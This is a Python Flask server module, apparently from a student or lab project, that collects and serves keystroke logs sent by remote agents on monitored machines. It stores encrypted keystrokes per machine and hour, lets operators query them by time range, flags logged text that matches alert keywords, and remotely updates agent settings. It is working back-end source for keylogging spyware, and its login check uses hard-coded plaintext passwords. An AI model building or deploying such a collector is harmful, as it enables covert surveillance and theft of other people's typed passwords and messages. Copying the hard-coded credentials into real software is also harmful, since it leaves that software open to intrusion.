import os, json
from datetime import datetime, time as dtime
from flask import jsonify
from utils import Encryptor, deep_merge, ptime, hour_from_fname, timekey

LOG_DIR = "server_logs"
agent_settings = {
    "url": "http://127.0.0.1:5000/api/upload",
    "wait_time": 10,
    "status_listen": True,
    "key_encryptor": "nmrd",
}

# רשימת משתמשים מורשים
VALID_USERS = {
    "מאיר": "12345",
    "user2": "mypassword",
    "admin": "adminpass"
}

def is_valid_user(username: str, password: str) -> bool:
    """בודק אם שם המשתמש והסיסמה נכונים"""
    return username in VALID_USERS and VALID_USERS[username] == password

def update_settings(data):
    for key, value in data.items():
        if key in agent_settings:
            agent_settings[key] = value
    print(agent_settings)
    return jsonify({"status": "ok", "updated_settings": agent_settings})

def get_settings():
    return agent_settings

def save_notification(text):
    file_path = "notifications.json"
    alerts = []
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            alerts = json.load(f)
    if not text in alerts:
        alerts.append(text)
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(alerts, f, ensure_ascii=False, indent=2)

def get_notifications(file_path="notifications.json"):
    if not os.path.exists(file_path):
        return None
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            data = json.load(f)
            # נוודא שהמבנה הוא רשימה
            if isinstance(data, list):
                return data
            return None
    except (json.JSONDecodeError, OSError):
        return None

def delete_notification(notification_id):
    print(notification_id)
    print(type(notification_id))
    file_path = "notifications.json"
    alerts = []

    # קרא את הקובץ אם קיים
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            alerts = json.load(f)
    for alert in alerts:
        print(type(alert))
        if notification_id in alert:
                alerts.remove(alert)
                break

    # שמור בחזרה את הרשימה המעודכנת
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(alerts, f, ensure_ascii=False, indent=2)

def get_warnings():
    arr_notifications = get_notifications()
    key_of_notification = []
    data = {}
    for notification in arr_notifications:
        notice = json.loads(notification)
        key_of_notification.append(notice.get("keywords"))

    arr_machine = get_machines_list()
    for machine in arr_machine:
        res_find_notice = find_warnings_in_data(machine, key_of_notification)
        if res_find_notice:
            data.setdefault(machine, []).append(res_find_notice)
    return data

def save_keystrokes(data):
    enc = Encryptor()
    data = enc.encrypt_dict(data)
    machine = next(iter(data))
    payload = data.pop(machine)
    folder = os.path.join(LOG_DIR, machine)
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, f"{datetime.now():%Y-%m-%d_%H}.json")

    base = {}
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                base = dict(json.load(f))
        except: base = {}

    flat = payload.pop(next(iter(payload)))
    merged = deep_merge(flat, base)

    with open(path, "w", encoding="utf-8") as f:
        json.dump(merged, f, indent=4, ensure_ascii=False)
    return path

def get_machines_list():
    return os.listdir(LOG_DIR) if os.path.exists(LOG_DIR) else []

def find_warnings_in_data(machine, warnings):
    data = {}
    folder = os.path.join(LOG_DIR, machine)
    for filename in os.listdir(folder):
        file_n = filename[:-8]
        full_path = os.path.join(folder, filename)
        with open(full_path, "r", encoding="utf-8") as f:
            file_content = json.load(f)
            for k,v in file_content.items():
                if isinstance(v, dict):
                    for k_k , v_v in v.items():
                        if any(k in w or k_k in w or v_v in w for w in warnings):
                            data.setdefault(file_n, {}).setdefault(k, {}).setdefault(k_k, v_v)
    if data:
        return data
    return None

def get_all_keystrokes(machine):
    data = {}
    folder = os.path.join(LOG_DIR, machine)
    for filename in os.listdir(folder):
        full_path = os.path.join(folder, filename)
        with open(full_path, "r", encoding="utf-8") as f:
            file_n = filename[:-8]
            data[file_n] = json.load(f)
    if data:
        return data
    return None

def get_keystrokes(request):
    machine = request.args.get("machine")
    if not machine:
        return jsonify({"error": "Missing machine"}), 400

    date_str = request.args.get("date")
    start_t = ptime(request.args.get("start")) or dtime(0,0,0)
    end_t   = ptime(request.args.get("end"))   or dtime(23,59,59)
    if start_t > end_t: start_t, end_t = end_t, start_t

    folder = os.path.join(LOG_DIR, machine)
    if not os.path.isdir(folder): return jsonify([])

    files = [f for f in os.listdir(folder) if f.endswith(".json")]
    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
    sh, eh = start_t.hour, end_t.hour
    files = [f for f in files if ((h:=hour_from_fname(f)) is not None and sh <= h <= eh)]
    files.sort()

    out = []
    for f in files:
        p = os.path.join(folder, f)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                obj = json.load(fh)
        except Exception:
            with open(p, "r", encoding="utf-8") as fh:
                out.append(fh.read())
            continue

        if not isinstance(obj, dict):
            out.append(json.dumps(obj, ensure_ascii=False))
            continue

        filtered = {k:v for k,v in obj.items()
                    if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
        if filtered:
            out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
    return out

print(get_warnings())